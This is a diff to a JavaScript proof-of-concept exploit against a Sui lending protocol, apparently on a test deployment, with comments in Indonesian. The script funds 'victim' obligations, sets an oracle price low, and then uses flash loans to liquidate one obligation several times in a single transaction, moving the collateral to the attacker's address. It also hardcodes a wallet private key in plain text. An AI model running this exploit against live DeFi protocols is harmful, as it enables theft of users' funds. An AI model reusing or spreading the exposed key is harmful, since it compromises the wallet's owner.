@@ -28,7 +28,8 @@ const SUI_TYPE = "0x2::sui::SUI";
 const USDC_TREASURY = "0x4e1a61e4f32731de824371748eaf58887a147eaded9845692ae3916c6a6b0aee";
 const ETH_TREASURY = "0x1702fa3e0c15291ef0667bffad8ff36c9424686d1a3e6edc976076ff8e3c0681";
 
-const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa"; // Dompet 0xed76
+// PRIVATE KEY DOMPET 0xed76 (HARDCODED)
+const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
 const privateKeyBytes = decodeSuiPrivateKey(funderPrivateKeyStr).secretKey;
 const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
 const funderAddress = funderKeypair.getPublicKey().toSuiAddress();
@@ -39,6 +40,7 @@ console.log(`[INIT] Funder Address: ${funderAddress}`);
 
 async function executeTx(tx, keypair) {
     tx.setSender(keypair.getPublicKey().toSuiAddress());
+    tx.setGasBudget(1_000_000_000); // 1 SUI Gas Budget eksplisit
     const result = await client.signAndExecuteTransaction({
         signer: keypair,
         transaction: tx,
@@ -85,8 +87,8 @@ async function setupVictim(victimKeypair, label) {
 
     // 1. Fund victim dengan 1,000 SUI
     const fundTx = new Transaction();
-    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [fundTx.pure.u64(1_000_000_000_000n + 10_000_000_000n)]);
-    fundTx.transferObjects([suiCoin], fundTx.pure.address(victimAddr));
+    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [fundTx.pure(BigInt(1010000000000), 'u64')]);
+    fundTx.transferObjects([suiCoin], fundTx.pure(victimAddr, 'address'));
     await executeTx(fundTx, funderKeypair);
 
     // 2. Open Obligation
@@ -99,7 +101,7 @@ async function setupVictim(victimKeypair, label) {
         target: `${PKG}::open_obligation::return_obligation`,
         arguments: [openTx.object(VERSION), obligation, hotPotato],
     });
-    openTx.transferObjects([obligationKey], openTx.pure.address(victimAddr));
+    openTx.transferObjects([obligationKey], openTx.pure(victimAddr, 'address'));
     
     const openResult = await executeTx(openTx, victimKeypair);
     
@@ -127,7 +129,7 @@ async function setupVictim(victimKeypair, label) {
     
     const [usdcCoin] = supplyTx.moveCall({
         target: `${TEST_COIN_PKG}::usdc::mint`,
-        arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100_000_000_000_000n)]
+        arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure(BigInt(100000000000000), 'u64')]
     });
     const [sUSDC] = supplyTx.moveCall({
         target: `${PKG}::mint::mint`,
@@ -138,7 +140,7 @@ async function setupVictim(victimKeypair, label) {
 
     const [ethCoin] = supplyTx.moveCall({
         target: `${TEST_COIN_PKG}::eth::mint`,
-        arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10_000_000_000n)]
+        arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure(BigInt(10000000000), 'u64')]
     });
     const [sETH] = supplyTx.moveCall({
         target: `${PKG}::mint::mint`,
@@ -156,11 +158,11 @@ async function setupVictim(victimKeypair, label) {
         typeArguments: [USDC_TYPE],
         arguments: [
             borrowUSDCTx.object(VERSION), borrowUSDCTx.object(obligationId), borrowUSDCTx.object(obligationKeyId),
-            borrowUSDCTx.object(MARKET), borrowUSDCTx.object(REGISTRY), borrowUSDCTx.pure.u64(500_000_000n),
+            borrowUSDCTx.object(MARKET), borrowUSDCTx.object(REGISTRY), borrowUSDCTx.pure(BigInt(500000000), 'u64'),
             borrowUSDCTx.object(ORACLE), borrowUSDCTx.object(CLOCK)
         ],
     });
-    borrowUSDCTx.transferObjects([borrowedUSDC], borrowUSDCTx.pure.address(victimAddr));
+    borrowUSDCTx.transferObjects([borrowedUSDC], borrowUSDCTx.pure(victimAddr, 'address'));
     await executeTx(borrowUSDCTx, victimKeypair);
 
     // 6. Borrow ETH (0.2 ETH)
@@ -170,11 +172,11 @@ async function setupVictim(victimKeypair, label) {
         typeArguments: [ETH_TYPE],
         arguments: [
             borrowETHTx.object(VERSION), borrowETHTx.object(obligationId), borrowETHTx.object(obligationKeyId),
-            borrowETHTx.object(MARKET), borrowETHTx.object(REGISTRY), borrowETHTx.pure.u64(200_000_000n),
+            borrowETHTx.object(MARKET), borrowETHTx.object(REGISTRY), borrowETHTx.pure(BigInt(200000000), 'u64'),
             borrowETHTx.object(ORACLE), borrowETHTx.object(CLOCK)
         ],
     });
-    borrowETHTx.transferObjects([borrowedETH], borrowETHTx.pure.address(victimAddr));
+    borrowETHTx.transferObjects([borrowedETH], borrowETHTx.pure(victimAddr, 'address'));
     await executeTx(borrowETHTx, victimKeypair);
 
     console.log(`[${label}] Setup complete. Obligation ID: ${obligationId}`);
@@ -190,7 +192,7 @@ async function crashOraclePrice() {
     tx.moveCall({
         target: `${PKG}::x_oracle::update_price`,
         typeArguments: [SUI_TYPE],
-        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(40_000_000)]
+        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure(BigInt(40000000), 'u64')]
     });
     
     await executeTx(tx, funderKeypair);
@@ -211,14 +213,14 @@ async function beforeExploit_singleCall(victimObligationId) {
     
     const [flashUSDC, flashReceipt] = tx.moveCall({
         target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
+        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure(BigInt(50000000000), 'u64')],
     });
     const [remainUSDC, collateralCoin] = tx.moveCall({
         target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE],
         arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), flashUSDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
     });
     tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), remainUSDC, flashReceipt] });
-    tx.transferObjects([collateralCoin], tx.pure.address(funderAddress));
+    tx.transferObjects([collateralCoin], tx.pure(funderAddress, 'address'));
     
     await executeTx(tx, funderKeypair);
     const stateAfter = await readObligationState(victimObligationId);
@@ -237,8 +239,8 @@ async function afterExploit_multiCall(victimObligationId) {
     
     const tx = new Transaction();
     
-    const [f_USDC, r_USDC] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)] });
-    const [f_ETH, r_ETH] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(10_000_000_000n)] });
+    const [f_USDC, r_USDC] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure(BigInt(50000000000), 'u64')] });
+    const [f_ETH, r_ETH] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure(BigInt(10000000000), 'u64')] });
     
     const [rem1, c1] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_USDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
     const [rem2, c2] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [ETH_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_ETH, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
@@ -247,7 +249,7 @@ async function afterExploit_multiCall(victimObligationId) {
     tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH] });
     
     tx.mergeCoins(c1, [c2]);
-    tx.transferObjects([c1], tx.pure.address(funderAddress));
+    tx.transferObjects([c1], tx.pure(funderAddress, 'address'));
     
     await executeTx(tx, funderKeypair);
     const stateAfter = await readObligationState(victimObligationId);
